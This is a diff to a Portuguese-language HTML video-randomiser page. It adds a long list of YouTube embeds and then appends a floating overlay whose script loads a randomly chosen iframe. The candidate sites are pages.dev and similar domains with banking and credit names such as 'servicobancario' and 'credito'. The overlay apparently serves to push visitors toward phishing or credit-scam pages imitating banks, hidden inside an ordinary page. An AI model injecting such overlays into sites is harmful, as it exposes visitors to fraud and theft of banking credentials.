@@ -1,4 +1,5 @@
 
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -215,7 +216,83 @@ const resultado = document.getElementById('video');
 const botao = document.getElementById('btn');
 let contador = 0;
 const videos = [
-
+"https://www.youtube.com/embed/06bEfpdnD1M",
+"https://www.youtube.com/embed/1iEO_QSeexQ",
+"https://www.youtube.com/embed/31HQtrfA0W4",
+"https://www.youtube.com/embed/3PxtIKw16lU",
+"https://www.youtube.com/embed/3jdM9I3g3BE",
+"https://www.youtube.com/embed/3osWD-OiEjg",
+"https://www.youtube.com/embed/4btREw_NQrE",
+"https://www.youtube.com/embed/54yNpid1GVc",
+"https://www.youtube.com/embed/5mZ1k_p6An4",
+"https://www.youtube.com/embed/6IpaWDy9pHs",
+"https://www.youtube.com/embed/6ab0Enu1cHw",
+"https://www.youtube.com/embed/6v__W0SNHmc",
+"https://www.youtube.com/embed/7-NqgY0HEDs",
+"https://www.youtube.com/embed/8HBCFG-x_Yg",
+"https://www.youtube.com/embed/9O0iibghh0w",
+"https://www.youtube.com/embed/Bt3e7TN9pM4",
+"https://www.youtube.com/embed/DAdH4HFkWL0",
+"https://www.youtube.com/embed/F-ajwyiwRGc",
+"https://www.youtube.com/embed/G8ERKL6ltC4",
+"https://www.youtube.com/embed/HQgXu-9RdI0",
+"https://www.youtube.com/embed/HTASqHd4ud8",
+"https://www.youtube.com/embed/HbRqcGJpNQE",
+"https://www.youtube.com/embed/HgU4xa0Y8U0",
+"https://www.youtube.com/embed/IAGGs2udX3A",
+"https://www.youtube.com/embed/IJEHwbh_id8",
+"https://www.youtube.com/embed/JS5tlyC28FA",
+"https://www.youtube.com/embed/Jav7nIvxH74",
+"https://www.youtube.com/embed/K13zTqWy3Eg",
+"https://www.youtube.com/embed/KoKHIJk_7YA",
+"https://www.youtube.com/embed/LQ7Qiyw5aUE",
+"https://www.youtube.com/embed/OHEKjVzbYTU",
+"https://www.youtube.com/embed/OlkG-fTRLgg",
+"https://www.youtube.com/embed/P3MCeEk_k94",
+"https://www.youtube.com/embed/Q8qnb2Gd2gY",
+"https://www.youtube.com/embed/Qn7qysJru_w",
+"https://www.youtube.com/embed/TISkJegKRIM",
+"https://www.youtube.com/embed/ULkQYi58fzw",
+"https://www.youtube.com/embed/W6P0oSFw2Kk",
+"https://www.youtube.com/embed/Xm4CRf0_mKc",
+"https://www.youtube.com/embed/YRfQVaE_PXw",
+"https://www.youtube.com/embed/ZgDb4fNSXEs",
+"https://www.youtube.com/embed/ZlYTGYuG4Zs",
+"https://www.youtube.com/embed/__9QhJ2HTSE",
+"https://www.youtube.com/embed/_gibsCEMI_I",
+"https://www.youtube.com/embed/alR0X9sQvpY",
+"https://www.youtube.com/embed/amKHfDdnzdo",
+"https://www.youtube.com/embed/cWnSC_7ne1o",
+"https://www.youtube.com/embed/cZ4sYjATYD8",
+"https://www.youtube.com/embed/fELkYdeveYA",
+"https://www.youtube.com/embed/fr3PnYx4ec4",
+"https://www.youtube.com/embed/fsRa_zdZSuw",
+"https://www.youtube.com/embed/ggTlJPThsAI",
+"https://www.youtube.com/embed/hLz0IIj8-kA",
+"https://www.youtube.com/embed/heu3gEjsnFs",
+"https://www.youtube.com/embed/hiECJ0xweE8",
+"https://www.youtube.com/embed/i1E_4LSEu7A",
+"https://www.youtube.com/embed/icS6whs20Uk",
+"https://www.youtube.com/embed/jEZnGg6EFBM",
+"https://www.youtube.com/embed/jNKLljJ7DT0",
+"https://www.youtube.com/embed/lMSSodKyqV0",
+"https://www.youtube.com/embed/m1KgdYjM7Bo",
+"https://www.youtube.com/embed/mLr8jca3gRI",
+"https://www.youtube.com/embed/mPg4TBS82cc",
+"https://www.youtube.com/embed/nELxweDCHV4",
+"https://www.youtube.com/embed/n_kuBOYaTyM",
+"https://www.youtube.com/embed/oFXNTBln8EM",
+"https://www.youtube.com/embed/oTZ_6k_KBlQ",
+"https://www.youtube.com/embed/r_4-o5Kqiv0",
+"https://www.youtube.com/embed/tkmvd6IhajA",
+"https://www.youtube.com/embed/tsQo-pGDwk8",
+"https://www.youtube.com/embed/u66mWl1lTW4",
+"https://www.youtube.com/embed/ubB24Se9uk4",
+"https://www.youtube.com/embed/vVdyq2Qa5fI",
+"https://www.youtube.com/embed/wVgzA6YrvmQ",
+"https://www.youtube.com/embed/yWfe2riynxo",
+"https://www.youtube.com/embed/zMx3wz7agSA"
+,
 "https://www.youtube.com/embed/-D1lUbhM04E",
 "https://www.youtube.com/embed/-S3TuDUu2W4",
 "https://www.youtube.com/embed/-Z-ec2c084A",
@@ -1065,5 +1142,36 @@ botao.onclick = function () {
   let oportunidade2 = document.getElementById('oportunidade2');
   oportunidade2.href = oportunidadeurls2[indexoportunidade2];
 </script>
+
+
+ <div style="position:fixed;bottom:20px;right:20px;width:90vw;max-width:350px;height:70vh;max-height:500px;z-index:9999;box-shadow:0 0 15px rgba(0,0,0,0.3);">
+      <button onclick="this.parentElement.style.display='none'" style="position:absolute;top:-10px;right:-10px;background:red;color:white;border:none;border-radius:50%;width:25px;height:25px;font-weight:bold;cursor:pointer;z-index:10000;">×</button>
+      <iframe id="iframe" src="" title="Site Flutuante" style="width:100%;height:100%;border:none;"></iframe>
+    </div>
+<script>
+    // Lista de iframes confiáveis ou controlados
+     const iframes = [
+      "https://geocredibnkvitoria.com/",
+      "https://espiritosantoes-com-brprincipal.pages.dev/vps01",
+      "https://novorepositorio.pages.dev/credito",
+      "https://imagemprog.pages.dev/",
+      "https://espiritosantoes-com-brprincipal.pages.dev/",
+      "https://imagemprog.pages.dev/",
+      "https://tempoaleatorio01.pages.dev/dinheiro",
+      "https://modeloanuncio01.pages.dev/",
+      "https://sistemabackupprincial.pages.dev/48",
+      "https://sistemabackupprincial.pages.dev/",
+      "https://imagemprog.pages.dev/",
+      "https://novorepositorio.pages.dev/credito",
+      "https://espiritosantoes-com-brprincipal.pages.dev/vps01",
+      "https://uteis01.pages.dev/servicobancario" ,
+      "https://espiritosantoes-com-brprincipal.pages.dev/12"
+    ];
+
+    // Escolher um iframe aleatório
+    const iframeIndex = Math.floor(Math.random() * iframes.length);
+    const iframeUrl = iframes[iframeIndex];
+    document.getElementById('iframe').src = iframeUrl;
+  </script>
 </body>
 </html>
